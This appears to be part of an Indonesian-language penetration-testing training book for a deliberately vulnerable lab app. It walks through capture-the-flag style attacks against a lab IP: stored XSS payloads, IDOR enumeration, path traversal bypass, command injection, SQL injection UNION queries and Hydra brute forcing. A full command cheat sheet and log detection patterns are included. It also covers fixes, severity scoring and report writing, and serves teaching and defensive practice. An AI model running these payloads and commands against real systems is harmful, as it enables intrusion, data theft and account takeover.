+        <li>Payload <code>document.title=document.domain</code> hanya mengubah judul tab — bukti eksekusi yang aman
+          &amp; tidak merusak.</li>
+      </ul>
+      <b>Bukti:</b> buka assessment itu di peramban; judul tab berubah jadi nama domain = skrip Anda berjalan.</div>
+    <h4>Cara B — body dari berkas (aman untuk payload apa pun)</h4>
+    <pre><code>cat &gt; body.json &lt;&lt;'EOF'
+{"title":"xss uji","category":"xss","severity":"high","description":"&lt;img src=x onerror=document.title=document.domain&gt;"}
+EOF
+
+curl -s -b cookies.txt -X POST \
+  "http://72.62.120.97:8080/api/v1/assessments/ISI_ID_ASSESSMENT/vulnerabilities" \
+  -H 'content-type: application/json' -d @body.json</code></pre>
+    <div class="exp"><b>Penjelasan:</b> <code>cat &gt; body.json &lt;&lt;'EOF' ... EOF</code> menulis JSON ke berkas apa
+      adanya (tanda kutip <code>'EOF'</code> mencegah shell mengutak-atik isinya). <code>-d @body.json</code> mengirim
+      <b>isi berkas</b> sebagai body — jadi tanda kutip di dalam payload tak pernah bentrok dengan shell. Ini cara paling
+      tahan banting.</div>
+    <h4>Stored vs reflected XSS</h4>
+    <table>
+      <tr><th>Jenis</th><th>Di mana tersimpan</th><th>Dampak</th></tr>
+      <tr><td><b>Stored</b> (yang ini)</td><td>Tersimpan di database, jalan tiap kali halaman dibuka.</td><td>Mengenai setiap pengunjung — paling berbahaya.</td></tr>
+      <tr><td><b>Reflected</b></td><td>Dipantulkan dari parameter URL pada satu respons.</td><td>Butuh korban klik tautan jebakan.</td></tr>
+      <tr><td><b>DOM-based</b></td><td>Terjadi di JavaScript sisi klien.</td><td>Tak selalu terlihat di respons server.</td></tr>
+    </table>
+    <h4>Variasi payload tanpa tanda kutip (aman untuk shell)</h4>
+    <table>
+      <tr><th>Payload</th><th>Efek (aman)</th></tr>
+      <tr><td><code>&lt;img src=x onerror=document.title=document.domain&gt;</code></td><td>Ubah judul tab — bukti ringkas.</td></tr>
+      <tr><td><code>&lt;svg onload=document.title=1337&gt;</code></td><td>Pemicu lewat <code>&lt;svg&gt;</code>, bukti angka di judul.</td></tr>
+      <tr><td><code>&lt;video src=x onerror=document.body.style.outline=5px solid red&gt;</code></td><td>Bingkai merah visual — mudah difoto untuk laporan.</td></tr>
+    </table>
+    <div class="exp"><b>Mengapa demo yang "sopan"?</b> Payload nyata bisa mencuri cookie sesi
+      (<code>document.cookie</code>) dan mengirimnya ke penyerang. Untuk laporan, bukti yang <i>tidak</i> merusak
+      (judul/warna) sudah cukup membuktikan risiko, tanpa benar-benar mengeksfiltrasi data. Jelaskan potensi pencurian
+      cookie di bagian "Dampak" laporan, bukan dengan mempraktikkannya.</div>
+    <div class="detect"><b>Deteksi &amp; perbaikan:</b> encode output (escape HTML) saat render; terapkan
+      Content-Security-Policy; set cookie <code>HttpOnly</code> agar JS tak bisa membacanya; validasi input. Deteksi:
+      cari field yang memuat <code>&lt;script</code>/<code>onerror=</code>/<code>onload=</code>.</div>
+    <div class="note"><b>Skor keparahan:</b> Stored XSS = <b>High</b> (CVSS ~8.0). Alasan: skrip berjalan di peramban
+      setiap pengunjung, memungkinkan pencurian sesi &amp; aksi atas nama korban.</div>
+
+    <h3>6.3 IDOR — mengakses assessment milik orang lain</h3>
+    <p>Endpoint <code>GET /api/v1/assessments/:id/export</code> tidak memeriksa pemilik. Logged-in sebagai akun biasa,
+      Anda tetap bisa mengekspor assessment privat admin.</p>
+    <pre><code>curl -s -b cookies.txt \
+  "http://72.62.120.97:8080/api/v1/assessments/1/export" | jq '.description'
+# naikkan id: 2, 3, ... sampai menemukan assessment privat admin
+for i in $(seq 1 25); do
+  echo "== id $i =="
+  curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/assessments/$i/export" | jq -r '.title, .description' 2&gt;/dev/null
+done</code></pre>
+    <div class="exp"><b>Penjelasan:</b> perulangan <code>for</code> mencoba id 1–25. <code>jq -r '.title, .description'</code>
+      mencetak judul &amp; deskripsi tanpa tanda kutip. <b>Flag IDOR</b> berada di <code>description</code> assessment privat
+      admin. Inti IDOR: id ditebak berurutan &amp; tak ada cek kepemilikan.</div>
+    <div class="detect"><b>Perbaikan:</b> cek <code>assessment.ownerId === sesi.userId</code> (atau peran berwenang)
+      sebelum mengembalikan data. Gunakan id acak (UUID) agar sulit ditebak — tapi itu bukan pengganti cek otorisasi.</div>
+    <div class="note"><b>Skor keparahan:</b> IDOR ke data privat = <b>High</b> (CVSS ~7.5). Alasan: satu akun biasa
+      bisa membaca assessment pengguna/admin lain hanya dengan menebak id.</div>
+
+    <h3>6.4 Path Traversal &amp; Command Injection (RCE)</h3>
+    <h4>6.4a Path traversal pada <code>/files</code></h4>
+    <p>Filter hanya membuang <code>../</code> <b>sekali</b>. Maka <code>....//</code> → setelah satu pembuangan menjadi
+      <code>../</code> dan lolos.</p>
+    <pre><code>curl -s -b cookies.txt \
+  "http://72.62.120.97:8080/api/v1/files?name=....//secret/flag.txt"</code></pre>
+    <div class="exp"><b>Penjelasan:</b> <code>name=....//secret/flag.txt</code> — server menghapus satu <code>../</code> dari
+      <code>....//</code> menyisakan <code>../</code>, lalu membaca berkas di luar folder yang dibagikan. Hasilnya
+      <b>FLAG_TRAVERSAL</b>. Pelajaran: sanitasi "sekali jalan" bisa di-bypass; gunakan normalisasi path yang benar.</div>
+    <div class="note"><b>Skor keparahan:</b> Path traversal baca-berkas = <b>Medium–High</b> (CVSS ~6.5), naik bila
+      berkas yang terbaca berisi rahasia (konfigurasi, kunci).</div>
+    <h4>6.4b Command injection (RCE) pada <code>/tools/lookup</code></h4>
+    <p>Field <code>host</code> ditaruh mentah ke perintah shell <code>getent hosts &lt;host&gt;</code>. Dengan
+      <code>;</code> kita sambungkan perintah tambahan.</p>
+    <pre><code># 1) buktikan eksekusi perintah
+curl -s -b cookies.txt -X POST \
+  "http://72.62.120.97:8080/api/v1/tools/lookup" \
+  -H 'content-type: application/json' \
+  -d '{"host":"x; id"}' | jq
+
+# 2) baca flag RCE
+curl -s -b cookies.txt -X POST \
+  "http://72.62.120.97:8080/api/v1/tools/lookup" \
+  -H 'content-type: application/json' \
+  -d '{"host":"x; cat /tmp/youngowl-lab/.rce/flag"}' | jq</code></pre>
+    <div class="exp"><b>Penjelasan:</b> <code>"host":"x; id"</code> — <code>x</code> membuat lookup gagal (tak masalah),
+      lalu <code>;</code> mengakhiri perintah pertama dan <code>id</code> dijalankan sebagai perintah kedua. Output
+      <code>uid=...</code> membuktikan RCE. Perintah kedua membaca berkas flag di
+      <code>/tmp/youngowl-lab/.rce/flag</code> → <b>FLAG_RCE</b>.</div>
+    <div class="detect"><b>Perbaikan:</b> jangan serahkan input ke shell; pakai API resolusi DNS bawaan bahasa, atau
+      daftar-putih karakter &amp; <code>execFile</code> dengan argumen terpisah (tanpa shell).</div>
+    <div class="note"><b>Skor keparahan:</b> RCE = <b>Critical</b> (CVSS ~9.8). Alasan: eksekusi perintah di server
+      adalah dampak terparah — penyerang bisa membaca berkas, mencuri rahasia, dan (tanpa isolasi) berpindah ke sistem
+      lain. Di lab, egress yang diblokir membatasi langkah terakhir itu.</div>
+
+    <h3>6.5 Security Misconfiguration — debug endpoint tanpa auth</h3>
+    <pre><code>curl -s http://72.62.120.97:8080/api/v1/system/debug | jq</code></pre>
+    <div class="exp"><b>Penjelasan:</b> perhatikan <b>tidak ada</b> <code>-b cookies.txt</code> — endpoint ini tak butuh
+      login (itulah celahnya). Responsnya membocorkan <code>env</code> termasuk <code>DATABASE_URL</code> dan
+      <b>FLAG_DEBUG</b>. Endpoint debug yang tertinggal di produksi adalah misconfig klasik.</div>
+    <div class="detect"><b>Perbaikan:</b> matikan endpoint debug di produksi; jangan pernah kembalikan variabel
+      lingkungan/secret ke klien; lindungi dengan auth &amp; flag build.</div>
+    <div class="note"><b>Skor keparahan:</b> kebocoran konfigurasi tanpa auth = <b>High</b> (CVSS ~7.5) — naik ke
+      Critical bila <code>DATABASE_URL</code> berisi kredensial yang bisa dipakai dari luar. Perhatikan tiap field:
+      <code>DATABASE_URL</code> (lokasi &amp; kredensial DB), <code>VULN_MODE</code> (konfirmasi ini lab), dan
+      <code>flag</code> (bukti langsung).</div>
+
+    <h3>6.6 Authentication — enumerasi &amp; brute force terarah</h3>
+    <p>Dalam <code>vulnMode</code>, pesan login membedakan "email ada tapi password salah" vs "email tak ada", dan rate
+      limit praktis dimatikan — kombinasi yang memudahkan brute force.</p>
+    <h4>Enumerasi akun</h4>
+    <pre><code>curl -s -X POST "http://72.62.120.97:8080/api/v1/auth/login" \
+  -H 'content-type: application/json' \
+  -d '{"email":"intern@youngowl.lab","password":"salah"}'</code></pre>
+    <div class="exp"><b>Penjelasan:</b> <code>"Wrong password for this account."</code> menegaskan email itu
+      <b>ada</b>. Dengan membandingkan dua pesan, penyerang menyusun daftar email valid tanpa tahu password.</div>
+    <h4>Brute force dengan Hydra (target: akun intern berpassword lemah)</h4>
+    <pre><code>hydra -l intern@youngowl.lab -P /usr/share/wordlists/rockyou.txt \
+  -s 8080 72.62.120.97 http-post-form \
+  "/api/v1/auth/login:{\"email\"\:\"^USER^\"\,\"password\"\:\"^PASS^\"}:Wrong password" \
+  -H "Content-Type: application/json" -t 4 -f</code></pre>
+    <table>
+      <tr><th>Opsi</th><th>Arti</th></tr>
+      <tr><td><code>-l intern@youngowl.lab</code></td><td><i>login</i>: satu username tetap.</td></tr>
+      <tr><td><code>-P rockyou.txt</code></td><td><i>password list</i>: kamus; <code>sunshine</code> ada di dalamnya.</td></tr>
+      <tr><td><code>-s 8080</code></td><td>Port target.</td></tr>
+      <tr><td><code>http-post-form</code></td><td>Modul: kirim form via POST (di sini body JSON).</td></tr>
+      <tr><td>string <code>"path:body:penanda"</code></td><td>Path, template body dengan <code>^USER^</code>/<code>^PASS^</code>, lalu <b>penanda gagal</b> <code>Wrong password</code> — Hydra menganggap respons tanpa penanda itu sebagai sukses.</td></tr>
+      <tr><td><code>-t 4</code></td><td>4 percobaan paralel — pelan agar andal.</td></tr>
+      <tr><td><code>-f</code></td><td>Berhenti begitu satu pasangan benar ditemukan.</td></tr>
+    </table>
+    <div class="note"><b>Catatan marker:</b> karena <code>vulnMode</code> memakai pesan <code>Wrong password</code>
+      untuk gagal (bukan <code>No account</code>), penanda gagal yang benar adalah <code>Wrong password</code>.</div>
+    <div class="detect"><b>Perbaikan:</b> samakan pesan ("email atau password salah"), aktifkan rate limit &amp;
+      lockout, wajibkan password kuat + MFA.</div>
+    <div class="note"><b>Skor keparahan:</b> enumerasi + brute = <b>Medium–High</b> (CVSS ~7.3). Enumerasi sendiri
+      Medium (membocorkan akun valid); dikombinasikan dengan rate limit lemah &amp; password lemah, dampaknya naik karena
+      pengambilalihan akun jadi praktis. <i>Lockout</i> = kunci sementara akun/IP setelah sekian gagal.</div>
+
+    <h3>6.7 Merangkai celah (chaining)</h3>
+    <p>Serangan nyata jarang berdiri sendiri. Contoh rantai di lab ini:</p>
+    <ol>
+      <li><code>/system/debug</code> (tanpa auth) → bocor konfigurasi &amp; konfirmasi <code>vulnMode</code>.</li>
+      <li>Brute <code>intern</code> → dapat sesi login.</li>
+      <li>SQLi <code>/targets/search</code> → dump <code>users</code> (email &amp; hash admin).</li>
+      <li>IDOR <code>/assessments/:id/export</code> → baca data privat admin.</li>
+      <li>RCE <code>/tools/lookup</code> → eksekusi perintah di server (lanjut ke BAB 7).</li>
+    </ol>
+    <div class="exp"><b>Mengapa penting:</b> laporan yang menggambarkan <i>rantai</i> menunjukkan dampak sebenarnya —
+      dari "satu bug kecil" menjadi "ambil alih data &amp; server".</div>
+
+    <h3>6.8 Walkthrough lengkap: tangkap semua flag berurutan</h3>
+    <p>Mari satukan semuanya dalam satu sesi, persis urutan yang Anda ketik. Salin blok ini baris demi baris &amp;
+      amati hasil tiap langkah.</p>
+    <pre><code><span class="c"># Langkah 1 — pastikan lab benar</span>
+curl -s http://72.62.120.97:8080/api/v1/system/health | jq '.vulnMode'
+<span class="c"># Harus: true</span>
+
+<span class="c"># Langkah 2 — flag DEBUG (tanpa login)</span>
+curl -s http://72.62.120.97:8080/api/v1/system/debug | jq '.flag'
+
+<span class="c"># Langkah 3 — login simpan sesi</span>
+curl -s -c cookies.txt -X POST "http://72.62.120.97:8080/api/v1/auth/login" \
+  -H 'content-type: application/json' \
+  -d '{"email":"intern@youngowl.lab","password":"sunshine"}' | jq '.user.email'
+
+<span class="c"># Langkah 4 — flag SQLi</span>
+curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/targets/search?q=xyz%27%20UNION%20SELECT%20id,name,value,hint,created_at::text,%27x%27%20FROM%20lab_flags--%20" | jq '.data'
+
+<span class="c"># Langkah 5 — flag TRAVERSAL</span>
+curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/files?name=....//secret/flag.txt"
+
+<span class="c"># Langkah 6 — flag RCE</span>
+curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/tools/lookup" \
+  -H 'content-type: application/json' \
+  -d '{"host":"x; cat /tmp/youngowl-lab/.rce/flag"}' | jq -r '.output'
+
+<span class="c"># Langkah 7 — flag IDOR (telusuri id assessment)</span>
+for i in $(seq 1 25); do
+  curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/assessments/$i/export" \
+    | jq -r 'select(.description!=null) | "id='"$i"' -> " + .description'
+done</code></pre>
+    <div class="exp"><b>Penjelasan ringkas:</b> tiap langkah memakai teknik dari BAB 6 dengan penjelasan yang sudah
+      dibahas. Langkah 7 menyaring respons yang punya <code>description</code> lalu mencetaknya dengan id-nya — flag
+      IDOR muncul di deskripsi assessment privat admin. Setelah tujuh langkah, Anda memegang kelima flag berbasis file
+      (DEBUG, SQLI, TRAVERSAL, RCE, IDOR) plus bukti XSS dari BAB 6.2.</div>
+    <div class="note"><b>Latihan mandiri:</b> ulangi dengan akun <code>researcher</code> atau <code>student</code> dan
+      perhatikan IDOR tetap berhasil — bukti bahwa masalahnya otorisasi, bukan peran akun.</div>
+    <h4>Seperti apa respons yang "berhasil"?</h4>
+    <p>Supaya Anda tahu kapan sebuah langkah berhasil, berikut gambaran respons yang diharapkan (nilai disederhanakan):</p>
+    <pre><code><span class="c"># Langkah 2 (debug) — flag langsung di field flag</span>
+"FLAG_DEBUG_xxxxxxxx"
+
+<span class="c"># Langkah 4 (SQLi) — flag ada di kolom value hasil UNION</span>
+[ { "ipAddress": "YO{un10n_s3l3ct_th3_0wl}", ... } ]
+
+<span class="c"># Langkah 6 (RCE) — output perintah di dalam field output</span>
+FLAG_RCE_xxxxxxxx
+
+<span class="c"># Langkah 7 (IDOR) — baris dengan deskripsi assessment privat admin</span>
+id=7 -> ... FLAG_IDOR_xxxxxxxx ...</code></pre>
+    <div class="exp"><b>Penjelasan:</b> karena hasil UNION dipetakan ke kolom respons yang ada (mis.
+      <code>ipAddress</code>), flag SQLi bisa muncul di nama field yang "tidak nyambung" — itu normal, karena kita
+      memaksa kolom kita masuk ke slot kolom asli. Yang penting: teksnya dimulai dengan <code>YO{</code> atau
+      <code>FLAG_</code>. Jika Anda melihatnya, langkah itu sukses.</div>
+
+    <!-- BAB 7 -->
+    <h2 class="chapter"><span class="n">BAB 7</span>Post-Exploitation (di lab) — lalu deteksi</h2>
+    <p class="lead">Setelah mendapat eksekusi perintah (BAB 6.4b), post-exploitation adalah apa yang dilakukan penyerang
+      selanjutnya. Karena berpotensi merusak, bab ini berhenti di tahap <b>bukti konsep</b> dan menekankan
+      <b>deteksi &amp; pembersihan</b>. Semua hanya di lab Anda yang terisolasi &amp; auto-reset.</p>
+
+    <h3>7.1 Orientasi: siapa &amp; di mana saya</h3>
+    <pre><code>curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/tools/lookup" \
+  -H 'content-type: application/json' -d '{"host":"x; id; uname -a; pwd"}' | jq -r '.output'</code></pre>
+    <div class="exp"><b>Penjelasan:</b> satu permintaan menjalankan tiga perintah informasi: <code>id</code> (user &amp;
+      grup), <code>uname -a</code> (versi kernel/OS), <code>pwd</code> (folder kerja). Ini langkah pertama penyerang untuk
+      memahami lingkungan. <code>jq -r '.output'</code> menampilkan keluaran apa adanya.</div>
+
+    <h3>7.2 Enumerasi lokal (membaca, tidak mengubah)</h3>
+    <pre><code>-d '{"host":"x; ls -la /tmp/youngowl-lab; cat /etc/os-release; env | head"}'</code></pre>
+    <div class="exp"><b>Penjelasan:</b> hanya perintah <b>baca</b>: daftar berkas lab, info OS, sebagian variabel
+      lingkungan. Tujuannya memahami apa yang bisa dijangkau — bukan mengubah apa pun.</div>
+
+    <h3>7.3 Konsep web shell &amp; reverse shell (tingkat tinggi)</h3>
+    <p>Dua teknik umum untuk mempertahankan akses — dijelaskan secara <b>konseptual</b> agar Anda paham &amp; bisa
+      mendeteksinya, tanpa langkah senjata siap pakai:</p>
+    <ul>
+      <li><strong>Web shell</strong> — berkas yang ditanam agar bisa menerima perintah lewat HTTP. <b>Tanda</b>:
+        berkas skrip baru di folder yang dapat diakses web, permintaan aneh berisi parameter perintah.</li>
+      <li><strong>Reverse shell</strong> — target "menelepon balik" ke mesin penyerang untuk memberi shell interaktif.
+        <b>Tanda</b>: koneksi keluar tak wajar dari server ke IP/port asing.</li>
+    </ul>
+    <div class="warn-box"><b>Batas etis buku ini.</b> Kami sengaja <b>tidak</b> memberi muatan reverse shell siap jalan
+      atau teknik menghindari antivirus/EDR. Fokusnya memahami mekanisme &amp; cara mendeteksinya. Di lab Young Owl,
+      egress diblokir (lihat <code>firewall.sh</code>), jadi reverse shell keluar tidak akan terhubung — itu memang
+      pertahanan yang benar.</div>
+
+    <h3>7.4 Persistence — konsep &amp; deteksi</h3>
+    <p>Persistence = cara agar akses bertahan setelah reboot. Contoh umum: cron job, service baru, kunci SSH tambahan,
+      akun baru. <b>Untuk lab</b>, jangan tanam apa pun permanen — lab auto-reset dan container read-only sebagian.</p>
+    <div class="detect"><b>Deteksi persistence:</b> bandingkan dengan baseline — cron tak dikenal
+      (<code>crontab -l</code>, <code>/etc/cron.*</code>), service baru, kunci di <code>~/.ssh/authorized_keys</code>,
+      akun baru di <code>/etc/passwd</code>, berkas dengan mtime mencurigakan.</div>
+
+    <h3>7.5 Situational awareness (read-only)</h3>
+    <p>Setelah "masuk", penyerang memetakan apa yang bisa dijangkau. Semua perintah berikut hanya <b>membaca</b>,
+      dijalankan lewat celah RCE yang sudah terbukti — tujuannya memahami, bukan merusak:</p>
+    <table>
+      <tr><th>Perintah (lewat field host)</th><th>Apa yang diungkap</th></tr>
+      <tr><td><code>id</code>, <code>whoami</code></td><td>User &amp; grup proses — seberapa tinggi hak kita.</td></tr>
+      <tr><td><code>cat /etc/os-release</code></td><td>Distribusi &amp; versi OS.</td></tr>
+      <tr><td><code>ps aux | head</code></td><td>Proses yang berjalan — layanan apa saja di host.</td></tr>
+      <tr><td><code>ls -la /app 2&gt;/dev/null</code></td><td>Lokasi kode aplikasi (bila terjangkau).</td></tr>
+      <tr><td><code>env</code></td><td>Variabel lingkungan — kadang berisi kredensial (temuan tersendiri).</td></tr>
+    </table>
+    <div class="exp"><b>Penjelasan:</b> informasi ini menentukan "seberapa dalam" dampak. Jika proses berjalan sebagai
+      root, dampaknya jauh lebih parah — itu masuk ke bagian "Dampak" laporan. Di lab, cukup buktikan Anda <i>bisa</i>
+      melihatnya; tak perlu mengeksploitasi lebih jauh.</div>
+    <h3>7.6 Konsep privilege escalation (deteksi)</h3>
+    <p>Privilege escalation = naik dari user biasa ke root. Pemeriksaan umum (konseptual): konfigurasi
+      <code>sudo</code> yang longgar, binary ber-SUID tak wajar, kernel usang. <b>Fokus kita deteksi</b>: pantau
+      perubahan hak &amp; eksekusi tak biasa.</p>
+    <div class="detect"><b>Deteksi:</b> audit log <code>sudo</code>, pantau pembuatan proses anak tak wajar dari proses
+      web, dan bandingkan daftar SUID dengan baseline. Perubahan mendadak = sinyal.</div>
+    <h3>7.7 Membersihkan</h3>
+    <div class="exp"><b>Penjelasan:</b> pentester yang baik mengembalikan keadaan. Di lab Young Owl, cukup picu
+      <b>auto-reset</b> (atau restart container) — tmpfs &amp; seed akan memulihkan flag &amp; data. Catat di laporan apa
+      saja yang sempat Anda ubah.</div>
+
+    <!-- BAB 8 -->
+    <h2 class="chapter"><span class="n">BAB 8</span>Deteksi, Monitoring &amp; Pelaporan</h2>
+    <p class="lead">Menyerang hanya setengah cerita. Nilai sebenarnya ada di menutup celah &amp; mampu mendeteksi
+      serangan berikutnya. Bab ini mengubah temuan menjadi laporan yang bisa ditindaklanjuti.</p>
+
+    <h3>8.1 Tanda-tanda tiap serangan di log</h3>
+    <table>
+      <tr><th>Serangan</th><th>Pola di log yang bisa dipantau</th></tr>
+      <tr><td>SQLi</td><td>Parameter berisi <code>UNION SELECT</code>, <code>'</code>, <code>--</code>; lonjakan error 500 dari satu endpoint.</td></tr>
+      <tr><td>XSS tersimpan</td><td>Field berisi <code>&lt;script</code>, <code>onerror=</code>, <code>&lt;img</code>.</td></tr>
+      <tr><td>IDOR</td><td>Satu akun mengakses banyak <code>id</code> berurutan dalam waktu singkat.</td></tr>
+      <tr><td>Path traversal</td><td><code>name=</code> berisi <code>../</code>, <code>....//</code>, nama berkas sensitif.</td></tr>
+      <tr><td>RCE</td><td>Field <code>host</code> berisi <code>;</code>, <code>|</code>, <code>&amp;&amp;</code>, backtick.</td></tr>
+      <tr><td>Brute force</td><td>Banyak POST <code>/auth/login</code> gagal dari satu IP/akun.</td></tr>
+      <tr><td>Recon</td><td>Banyak 404 beruntun (ffuf/gobuster), User-Agent scanner (nikto/nuclei).</td></tr>
+    </table>
+    <div class="note">Young Owl memiliki modul <i>attack monitor</i> (PR #8). Korelasikan pola di atas dengan
+      dasbornya untuk melihat serangan Anda sendiri terekam.</div>
+
+    <h3>8.2 Struktur laporan pentest</h3>
+    <ol>
+      <li><strong>Ringkasan eksekutif</strong> — untuk non-teknis: risiko utama &amp; dampak bisnis, 1 halaman.</li>
+      <li><strong>Lingkup &amp; metodologi</strong> — apa yang diuji (hanya lab), kapan, dengan cara apa.</li>
+      <li><strong>Temuan</strong> — per celah: deskripsi, tingkat (CVSS), bukti (perintah + respons + flag), dampak.</li>
+      <li><strong>Rekomendasi</strong> — perbaikan konkret &amp; prioritas.</li>
+      <li><strong>Lampiran</strong> — perintah mentah, output, timeline.</li>
+    </ol>
+    <h4>Contoh satu temuan (format)</h4>
+    <table>
+      <tr><th>Kolom</th><th>Isi contoh</th></tr>
+      <tr><td>Judul</td><td>SQL Injection pada <code>/api/v1/targets/search</code> (parameter <code>q</code>)</td></tr>
+      <tr><td>Keparahan</td><td>Critical (CVSS 9.8) — kebocoran kredensial</td></tr>
+      <tr><td>Bukti</td><td>Payload UNION + respons berisi <code>YO{un10n_s3l3ct_th3_0wl}</code> &amp; hash user</td></tr>
+      <tr><td>Dampak</td><td>Pembacaan seluruh database, termasuk hash password admin</td></tr>
+      <tr><td>Perbaikan</td><td>Prepared statement, sembunyikan error DB, hak akses DB minimal</td></tr>
+    </table>
+
+    <h4>Contoh temuan 2 — RCE</h4>
+    <table>
+      <tr><td>Judul</td><td>Command Injection pada <code>POST /api/v1/tools/lookup</code> (field <code>host</code>)</td></tr>
+      <tr><td>Keparahan</td><td>Critical (CVSS 9.8)</td></tr>
+      <tr><td>Reproduksi</td><td><code>-d '{"host":"x; id"}'</code> → output berisi <code>uid=...</code></td></tr>
+      <tr><td>Bukti</td><td>Pembacaan <code>/tmp/youngowl-lab/.rce/flag</code> → FLAG_RCE</td></tr>
+      <tr><td>Dampak</td><td>Eksekusi perintah OS di server; potensi pencurian rahasia</td></tr>
+      <tr><td>Perbaikan</td><td>Tanpa shell (<code>dns.lookup</code>/<code>execFile</code>) + whitelist (BAB 10.4)</td></tr>
+    </table>
+    <h4>Contoh temuan 3 — IDOR</h4>
+    <table>
+      <tr><td>Judul</td><td>IDOR pada <code>GET /api/v1/assessments/:id/export</code></td></tr>
+      <tr><td>Keparahan</td><td>High (CVSS 7.5)</td></tr>
+      <tr><td>Reproduksi</td><td>Login akun biasa → akses id milik admin → data privat terbaca</td></tr>
+      <tr><td>Bukti</td><td>FLAG_IDOR muncul di deskripsi assessment privat</td></tr>
+      <tr><td>Dampak</td><td>Kebocoran data assessment lintas pengguna</td></tr>
+      <tr><td>Perbaikan</td><td>Cek pemilik/peran tiap akses objek (BAB 10.3)</td></tr>
+    </table>
+
+    <h3>8.3 Menutup siklus</h3>
+    <div class="exp"><b>Penjelasan:</b> setelah perbaikan diterapkan, <b>uji ulang</b> dengan perintah yang sama di buku
+      ini. Temuan dianggap selesai hanya jika serangan yang dulu berhasil kini gagal. Ini mengubah pentest dari "daftar
+      masalah" menjadi "bukti perbaikan".</div>
+
+    <!-- BAB 9 -->
+    <h2 class="chapter"><span class="n">BAB 9</span>Lampiran: cheat sheet, glosarium &amp; checklist</h2>
+
+    <h3>9.1 Cheat sheet perintah (urut alur)</h3>
+    <pre><code><span class="c"># 0. Verifikasi + login (WAJIB dulu)</span>
+curl -s http://72.62.120.97:8080/api/v1/system/health | jq
+curl -s -c cookies.txt -X POST "http://72.62.120.97:8080/api/v1/auth/login" \
+  -H 'content-type: application/json' -d '{"email":"intern@youngowl.lab","password":"sunshine"}'
+
+<span class="c"># 1. Recon</span>
+curl -sI http://72.62.120.97:8080/
+whatweb -a 3 http://72.62.120.97:8080
+nmap -sV -sC -p 8080 -T4 -oN nmap-lab.txt 72.62.120.97
+ffuf -u http://72.62.120.97:8080/api/v1/FUZZ -w &lt;wordlist&gt; -mc 200,401,403 -t 40
+
+<span class="c"># 2. Scanning</span>
+nikto -h http://72.62.120.97:8080
+nuclei -u http://72.62.120.97:8080 -t http/exposures/ -t http/misconfiguration/
+sqlmap -u "http://72.62.120.97:8080/api/v1/targets/search?q=1" --cookie="..." --batch -p q
+
+<span class="c"># 3. Metasploit (recon http)</span>
+msfconsole -q
+use auxiliary/scanner/http/http_version ; set RHOSTS 72.62.120.97 ; set RPORT 8080 ; run
+
+<span class="c"># 4. Exploitation (semua butuh -b cookies.txt kecuali debug)</span>
+# SQLi flag:
+curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/targets/search?q=xyz%27%20UNION%20SELECT%20id,name,value,hint,created_at::text,%27x%27%20FROM%20lab_flags--%20" | jq
+# XSS (pakai -d @body.json bila payload berkutip):
+curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/assessments/ID/vulnerabilities" -H 'content-type: application/json' -d @body.json
+# IDOR:
+curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/assessments/1/export" | jq
+# Traversal:
+curl -s -b cookies.txt "http://72.62.120.97:8080/api/v1/files?name=....//secret/flag.txt"
+# RCE:
+curl -s -b cookies.txt -X POST "http://72.62.120.97:8080/api/v1/tools/lookup" -H 'content-type: application/json' -d '{"host":"x; cat /tmp/youngowl-lab/.rce/flag"}' | jq
+# Debug (tanpa auth):
+curl -s http://72.62.120.97:8080/api/v1/system/debug | jq</code></pre>
+
+    <h3>9.2 Glosarium perintah &amp; opsi</h3>
+    <table>
+      <tr><th>Istilah/opsi</th><th>Arti singkat</th></tr>
+      <tr><td><code>-s</code> (curl)</td><td>Silent — output bersih.</td></tr>
+      <tr><td><code>-I</code> (curl)</td><td>Hanya header respons.</td></tr>
+      <tr><td><code>-c</code> / <code>-b</code> (curl)</td><td>Simpan cookie / kirim cookie (sesi login).</td></tr>
+      <tr><td><code>-X</code> (curl)</td><td>Pilih metode HTTP (GET/POST/…).</td></tr>
+      <tr><td><code>-d</code> / <code>-d @file</code></td><td>Body request / body dari berkas (aman untuk payload berkutip).</td></tr>
+      <tr><td><code>-H</code> (curl)</td><td>Tambah header (mis. content-type).</td></tr>
+      <tr><td><code>jq</code></td><td>Format &amp; saring JSON.</td></tr>
+      <tr><td><code>%27</code>, <code>%20</code></td><td>URL-encode: <code>'</code> dan spasi.</td></tr>
+      <tr><td><code>UNION SELECT</code></td><td>SQL: gabung hasil query kedua (jumlah kolom harus sama).</td></tr>
+      <tr><td><code>-- </code> (SQL)</td><td>Komentar: abaikan sisa query (perhatikan spasi di akhir).</td></tr>
+      <tr><td><code>onerror=</code> (HTML)</td><td>Event handler yang jalan saat elemen gagal — pemicu XSS tanpa kutip.</td></tr>
+      <tr><td><code>;</code> (shell)</td><td>Pemisah perintah — kunci command injection.</td></tr>
+      <tr><td><code>-sV</code> / <code>-sC</code> (nmap)</td><td>Deteksi versi / skrip default.</td></tr>
+      <tr><td><code>-T4</code> (nmap)</td><td>Timing cepat.</td></tr>
+      <tr><td><code>-mc</code> / <code>-fs</code> (ffuf)</td><td>Cocokkan kode status / saring ukuran respons.</td></tr>
+      <tr><td><code>--batch</code> (sqlmap)</td><td>Jalan tanpa bertanya (jawaban default).</td></tr>
+      <tr><td><code>--level</code> / <code>--risk</code></td><td>Kedalaman uji / keagresifan payload sqlmap.</td></tr>
+      <tr><td><code>RHOSTS</code>/<code>RPORT</code> (msf)</td><td>Target &amp; port untuk modul Metasploit.</td></tr>
+      <tr><td><code>-l</code>/<code>-P</code>/<code>-f</code> (hydra)</td><td>Username / kamus password / berhenti saat ketemu.</td></tr>
+    </table>
+
+    <h3>9.3 Checklist ringkas</h3>
+    <table>
+      <tr><th>✔</th><th>Langkah</th></tr>
+      <tr><td>☐</td><td>Pastikan target = <code>72.62.120.97:8080</code> &amp; <code>vulnMode:true</code>.</td></tr>
+      <tr><td>☐</td><td>Login &amp; simpan <code>cookies.txt</code>.</td></tr>
+      <tr><td>☐</td><td>Recon: header, whatweb, nmap, ffuf endpoint.</td></tr>
+      <tr><td>☐</td><td>Scan: nikto, nuclei, sqlmap.</td></tr>
